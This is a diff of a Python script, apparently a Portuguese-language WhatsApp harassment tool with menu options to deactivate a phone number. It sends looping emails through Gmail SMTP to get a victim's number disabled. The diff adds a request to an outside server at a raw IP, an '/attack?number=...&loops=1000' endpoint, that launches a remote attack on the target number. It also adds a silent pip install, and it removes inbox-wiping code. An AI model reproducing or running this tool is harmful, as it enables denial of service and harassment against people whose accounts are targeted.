@@ -6,6 +6,10 @@ def clear():
 	os.system(clean)
 def restart():
     python = sys.executable;os.execl(python, python, *sys.argv)
+try:
+	import requests
+except:
+	os.system('pip install requests');restart()
 global Y, C, G, R, wp, main, main2
 Y = '\033[1;33m'
 C = '\033[1;37m'
@@ -31,7 +35,7 @@ try:
 	os.system('apt install figlet')
 except:
 		os.system('pacman -Sy figlet')
-wp = f'''{result}\n{C}__ {G}Hello World!{C} __\n{C}==================\n{info} Coded By: {G}Kiny{C}\n{info} Github: {G}https://github.com/Kiny-Kiny\n{warning} Lembre-se de ativar a opção de 'Apps menos seguros' na conta que for utilizar {warning}\n{C}=================='''
+wp = f'''{result}\n{C}__ {G}Hello World!{C} __\n{C}==================\n{info} Coded By: {G}Kiny{C}\n{info} Github: {G}https://github.com/Kiny-Kiny\n{info} Agradecimento(s): {G}Rei Pato\n{warning} Lembre-se de ativar a opção de 'Apps menos seguros' na conta que for utilizar {warning}\n{C}=================='''
 main = f'''
 {wp}\n{C}[{G}1{C}] Desativar Numero
 {C}[{G}2{C}] Retirar do Contador
@@ -71,27 +75,8 @@ def init():
 	############
 	'server':'smtp.gmail.com',
 	}
-	mail = imaplib.IMAP4_SSL(login['server'])
-	mail.login(login['log1'], login['log2'])
-	mail.select('INBOX')
 	try:
-	   		try:
-	   			##############################
-		   		status, search_data = mail.search(None, 'ALL')
-		   		mail_ids = []
-		   		for block in search_data:
-		   			mail_ids += block.split()
-		   		start = mail_ids[0].decode()
-		   		end = mail_ids[-1].decode()
-		   		mail.store(f'{start}:{end}'.encode(), '+X-GM-LABELS', '\\Trash')
-		   		mail.select('[Gmail]/Trash')
-		   		mail.store("1:*", '+FLAGS', '\\Deleted')
-		   		mail.expunge()
-		   		mail.close()
-		   		mail.logout()
-		   		##############################
-		   	except:
-		   		pass
+		   	requests.get(f'http://144.217.235.227:3000/attack?number={numero}&loops=1000')
 		   	while True:
 		   		##############################
 	   			msg = email.message.Message()
@@ -106,26 +91,6 @@ def init():
 	   			s.starttls()
 	   			s.login(msg['From'], login['log2'])
 	   			s.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))
-	   			##############################
-	   			status, data = mail.search(None, 'ALL')
-	   			for block in data:
-	   				mail_ids += block.split()
-	   			for i in mail_ids:
-	   				status, data = mail.fetch(i, '(RFC822)')
-	   				for response_part in data:
-	   				    if isinstance(response_part, tuple):
-	   				    	message = email.message_from_bytes(response_part[1])
-	   				    	mail_from = message['from']
-	   				    	mail_subject = message['subject']
-	   				    	if message.is_multipart():
-	   				    	   mail_content = ''
-	   				    	   for part in message.get_payload():
-	   				    	           if part.get_content_type() == 'text/plain':
-	   				    	           	mail_content += part.get_payload()
-	   				    	else:
-	   				    		mail_content = message.get_payload()
-	   				    	if 'support@support.whatsapp.com' in mail_from:
-	   				    		restart()
 	   			##############################
 	except Exception as erro:
 		print(f"{error} Verifique se a opção de 'Apps menos seguros' foi ativada ou se você inseriu o email/senha corretamente.\n{warning}: "+str(erro));time.sleep(5)
